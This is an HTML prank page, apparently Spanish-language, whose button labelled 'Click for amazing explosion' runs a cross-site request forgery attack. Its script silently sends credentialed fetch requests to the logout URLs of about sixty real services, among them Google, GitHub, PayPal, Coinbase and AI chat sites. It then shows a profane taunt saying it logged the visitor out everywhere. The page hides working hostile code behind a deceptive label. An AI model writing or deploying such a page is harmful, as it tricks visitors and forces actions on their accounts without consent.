<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LOGOUT EVERYTHING</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Bebas+Neue&display=swap');

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --red: #ff2020;
    --dark: #0a0a0a;
    --mid: #141414;
    --border: #222;
    --text: #e0e0e0;
    --muted: #555;
  }

  body {
    background: var(--dark);
    color: var(--text);
    font-family: 'Space Mono', monospace;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
  }

  .grid-bg {
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(255,32,32,0.04) 1px, transparent 1px),
      linear-gradient(90deg, rgba(255,32,32,0.04) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  .container {
    position: relative;
    z-index: 1;
    text-align: center;
    padding: 2rem;
    max-width: 600px;
    width: 100%;
  }

  .title {
    font-family: 'Bebas Neue', sans-serif;
    font-size: clamp(64px, 12vw, 120px);
    letter-spacing: 0.04em;
    line-height: 1;
    color: #fff;
    text-shadow: 0 0 40px rgba(255,32,32,0.3);
    margin-bottom: 0.2em;
  }

  .title span { color: var(--red); }

  .subtitle {
    font-size: 11px;
    letter-spacing: 0.2em;
    color: var(--muted);
    text-transform: uppercase;
    margin-bottom: 3rem;
  }

  /* progress log */
  #log {
    background: var(--mid);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 1rem;
    margin-bottom: 2rem;
    height: 180px;
    overflow-y: auto;
    text-align: left;
    font-size: 11px;
    color: var(--muted);
    display: none;
    scroll-behavior: smooth;
  }
  #log .entry { padding: 2px 0; border-bottom: 1px solid #1a1a1a; }
  #log .entry.ok { color: #3fba3f; }
  #log .entry.fail { color: var(--red); }
  #log .entry.info { color: #888; }

  /* THE BUTTON */
  #main-btn {
    display: inline-block;
    font-family: 'Bebas Neue', sans-serif;
    font-size: 28px;
    letter-spacing: 0.12em;
    color: #fff;
    background: var(--red);
    border: none;
    padding: 1rem 3.5rem;
    cursor: pointer;
    position: relative;
    clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
    transition: transform 0.1s, box-shadow 0.2s;
    box-shadow: 0 0 30px rgba(255,32,32,0.4);
    user-select: none;
  }
  #main-btn:hover { box-shadow: 0 0 50px rgba(255,32,32,0.7); transform: scale(1.03); }
  #main-btn:active { transform: scale(0.97); }
  #main-btn:disabled { background: #333; color: #555; box-shadow: none; cursor: not-allowed; }

  .sites-count {
    font-size: 10px;
    color: var(--muted);
    margin-top: 1rem;
    letter-spacing: 0.15em;
    text-transform: uppercase;
  }

  /* done screen */
  #done-screen {
    display: none;
    flex-direction: column;
    align-items: center;
    gap: 1.5rem;
    animation: fadeIn 0.5s ease;
  }
  #done-screen img {
    max-width: 340px;
    width: 90%;
    border-radius: 8px;
    box-shadow: 0 0 60px rgba(255,32,32,0.25);
  }
  #done-msg {
    font-family: 'Bebas Neue', sans-serif;
    font-size: 36px;
    letter-spacing: 0.1em;
    color: #3fba3f;
    text-shadow: 0 0 20px rgba(63,186,63,0.4);
  }
  #done-sub { font-size: 11px; color: var(--muted); letter-spacing: 0.15em; }

  @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

  #main-content { animation: fadeIn 0.6s ease; }

  /* scanline flicker on load */
  .scanline {
    position: fixed;
    top: -100%;
    left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.15) 2px, rgba(0,0,0,0.15) 4px);
    pointer-events: none;
    z-index: 999;
    animation: scan 8s linear infinite;
    opacity: 0.3;
  }
  @keyframes scan { 0% { top: -100%; } 100% { top: 100%; } }
</style>
</head>
<body>

<div class="grid-bg"></div>
<div class="scanline"></div>

<div class="container">

  <div id="main-content">

    <div id="log"></div>

    <button id="main-btn" onclick="startLogout()">Click for amazing explosion</button>
  </div>

  <div id="done-screen">
    <div id="done-msg">i fucking logged you out from everywhere :)</div>
    <img src="https://raton.lol/troll.png" alt="Done" />
    <div id="done-sub">sesiones terminadas</div>
  </div>

</div>

<script>
const SITES = [
  // Google / Microsoft
  { name: "Google", url: "https://accounts.google.com/logout" },
  { name: "YouTube", url: "https://www.youtube.com/logout" },
  { name: "Gmail", url: "https://accounts.google.com/logout" },
  { name: "Microsoft", url: "https://login.microsoftonline.com/common/oauth2/logout" },
  { name: "Outlook", url: "https://outlook.live.com/owa/?nlp=1&logout=1" },
  // Redes sociales
  { name: "Facebook", url: "https://www.facebook.com/logout.php" },
  { name: "Instagram", url: "https://www.instagram.com/accounts/logout/" },
  { name: "Twitter/X", url: "https://x.com/logout" },
  { name: "TikTok", url: "https://www.tiktok.com/logout" },
  { name: "LinkedIn", url: "https://www.linkedin.com/m/logout/" },
  { name: "Pinterest", url: "https://www.pinterest.com/logout/" },
  { name: "Reddit", url: "https://www.reddit.com/logout" },
  { name: "Tumblr", url: "https://www.tumblr.com/logout" },
  { name: "Snapchat", url: "https://accounts.snapchat.com/" },
  { name: "Threads", url: "https://www.threads.net/logout" },
  { name: "Mastodon", url: "https://mastodon.social/auth/sign_out" },
  { name: "Bluesky", url: "https://bsky.app/" },
  // Streaming
  { name: "Netflix", url: "https://www.netflix.com/logout" },
  { name: "Spotify", url: "https://accounts.spotify.com/en/logout" },
  { name: "Disney+", url: "https://www.disneyplus.com/logout" },
  { name: "Amazon Prime", url: "https://www.amazon.com/gp/flex/sign-out.html" },
  { name: "HBO Max", url: "https://www.max.com/" },
  { name: "Twitch", url: "https://www.twitch.tv/logout" },
  { name: "Crunchyroll", url: "https://www.crunchyroll.com/logout" },
  { name: "SoundCloud", url: "https://soundcloud.com/logout" },
  // Compras
  { name: "eBay", url: "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&lgout=1" },
  { name: "AliExpress", url: "https://login.aliexpress.com/logout.htm" },
  { name: "Etsy", url: "https://www.etsy.com/logout" },
  { name: "MercadoLibre", url: "https://www.mercadolibre.com/jms/mla/lgz/logout" },
  { name: "Falabella", url: "https://www.falabella.com/falabella-cl/logout" },
  { name: "Shopify", url: "https://accounts.shopify.com/logout" },
  // Trabajo / dev
  { name: "GitHub", url: "https://github.com/logout" },
  { name: "Slack", url: "https://slack.com/signout" },
  { name: "Notion", url: "https://www.notion.so/logout" },
  { name: "Figma", url: "https://www.figma.com/logout" },
  { name: "Trello", url: "https://trello.com/logout" },
  { name: "Atlassian/Jira", url: "https://id.atlassian.com/logout" },
  { name: "Dropbox", url: "https://www.dropbox.com/logout" },
  { name: "Zoom", url: "https://zoom.us/signout" },
  { name: "Canva", url: "https://www.canva.com/logout" },
  { name: "Claude", url: "https://claude.ai/logout" },
  { name: "ChatGPT", url: "https://chat.openai.com/auth/logout" },
  { name: "Vercel", url: "https://vercel.com/logout" },
  { name: "Netlify", url: "https://app.netlify.com/logout" },
  // Finanzas
  { name: "PayPal", url: "https://www.paypal.com/authflow/logout" },
  { name: "Stripe", url: "https://dashboard.stripe.com/logout" },
  { name: "Coinbase", url: "https://login.coinbase.com/logout" },
  { name: "Binance", url: "https://accounts.binance.com/en/logout" },
  // Otros
  { name: "Wikipedia", url: "https://en.wikipedia.org/w/index.php?title=Special:UserLogout" },
  { name: "Medium", url: "https://medium.com/m/logout" },
  { name: "Substack", url: "https://substack.com/sign-out" },
  { name: "WordPress", url: "https://wordpress.com/log-out/" },
  { name: "Duolingo", url: "https://www.duolingo.com/logout" },
  { name: "Airbnb", url: "https://www.airbnb.com/logout" },
  { name: "Booking", url: "https://account.booking.com/auth/logout" },
  { name: "Uber", url: "https://auth.uber.com/logout/" },
  { name: "Apple", url: "https://appleid.apple.com/sign-out" },
  { name: "Adobe", url: "https://ims-na1.adobelogin.com/ims/logout/v1" },
  { name: "Twilio", url: "https://login.twilio.com/logout" },
  { name: "Heroku", url: "https://id.heroku.com/sessions" },
  { name: "Cloudflare", url: "https://dash.cloudflare.com/logout" },
];

document.getElementById('count-label').textContent = SITES.length + ' sitios · fetch silencioso · sin popups';

function log(msg, type='info') {
  const el = document.getElementById('log');
  const entry = document.createElement('div');
  entry.className = 'entry ' + type;
  entry.textContent = msg;
  el.appendChild(entry);
  el.scrollTop = el.scrollHeight;
}

async function logoutOne(site) {
  try {
    await fetch(site.url, {
      method: 'GET',
      mode: 'no-cors',
      credentials: 'include',
      redirect: 'follow'
    });
    log('✓ ' + site.name, 'ok');
  } catch(e) {
    log('✗ ' + site.name + ' — ' + (e.message || 'error'), 'fail');
  }
}

async function startLogout() {
  const btn = document.getElementById('main-btn');
  const logEl = document.getElementById('log');
  btn.disabled = true;
  btn.textContent = '⏳ CERRANDO...';
  logEl.style.display = 'block';
  log('Iniciando logout masivo de ' + SITES.length + ' sitios...', 'info');

  const BATCH = 6;
  for (let i = 0; i < SITES.length; i += BATCH) {
    const batch = SITES.slice(i, i + BATCH);
    await Promise.all(batch.map(logoutOne));
    const pct = Math.min(100, Math.round(((i + BATCH) / SITES.length) * 100));
    btn.textContent = '⏳ ' + pct + '%';
    await new Promise(r => setTimeout(r, 80));
  }

  log('✓ Proceso completado.', 'ok');
  await new Promise(r => setTimeout(r, 600));

  document.getElementById('main-content').style.display = 'none';
  const done = document.getElementById('done-screen');
  done.style.display = 'flex';
}
</script>
</body>
</html>
